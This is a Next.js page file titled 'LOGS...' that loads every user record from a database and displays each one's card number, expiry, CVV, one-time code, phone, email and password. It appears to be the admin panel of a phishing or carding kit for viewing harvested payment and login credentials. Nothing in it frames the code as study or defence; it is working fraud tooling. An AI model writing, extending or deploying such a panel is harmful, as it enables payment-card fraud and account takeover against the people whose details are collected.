//import '../app/globals.css'

import { JSXElementConstructor, Key, ReactElement, ReactFragment, ReactPortal, useEffect } from 'react'

import User from 'model/User'
import dbConnect from '@/lib/dbConnect'
import { serialize } from 'v8'


//const inter = Inter({ subsets: ['latin'] })

export default function Home(params: { data: any}) {

  const { data } = params

  const data1 = JSON.parse(data)
  console.log(JSON.parse(data))
  
  return (
    <div className='w-[80%] m-auto bg-slate-500'>
      <div style={{marginTop:'1rem', textAlign:'center', fontSize:'2rem'}} >
          LOGS...
      </div>

      {
        data1?.length > 0 &&
        data1.map((d: {email: string | number   | null | undefined; pass: string | number  | null | undefined; cardNumber: string | number   | null | undefined; cvv: string | number  | null | undefined; exp: string | number | null | undefined; otp: string | number | null | undefined; username: string | number | null | undefined }, i: Key | null | undefined) => (
          <div style={{display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'}} key={i} >
            <div></div>
            <div style={styles.items}><div>CC</div><div>{d.cardNumber}</div></div>
            <div style={styles.items}><div>EXP pin</div><div>{d.exp}</div></div>
            <div style={styles.items}><div>CVV</div><div>{d.cvv}</div></div>
            <div style={styles.items}><div>otp</div><div>{d.otp}</div></div>
            <div style={styles.items}><div>Phone</div><div>{d.username}</div></div>
            <div style={styles.items}><div>email</div><div>{d.email}</div></div>
            <div style={styles.items}><div>pass</div><div>{d.pass}</div></div>
            <div style={{height:'4px', width:'100%', background:'gray'}}></div>
          </div>
        ))
      }

    </div>
  )
}
// flex flex-col gap-1 mt-8 pb-4 border-b-2 border-b-gray-700
const styles = {

  older: {display:'flex', flexDirection:'column', gap:'4px', borderColor:'gray', borderBottom:'2px', paddingBottom:'1rem'},
  items: { alignItems:'center', padding:'1.5rem', borderWidth:'2px', borderColor:'gray', display:'flex', justifyContent:'space-between', }
}


export async function getServerSideProps(context: any) {
  try {
  

    await dbConnect()
    const query = await User.find()
   // console.log(query)
    return {
      props: {
        data:JSON.stringify(query) 
      },
    }



  } catch (error) {
    console.log('logs.tsx:::', error)
    return {
      props: {
        data:null
      },
    }
    
  }
}

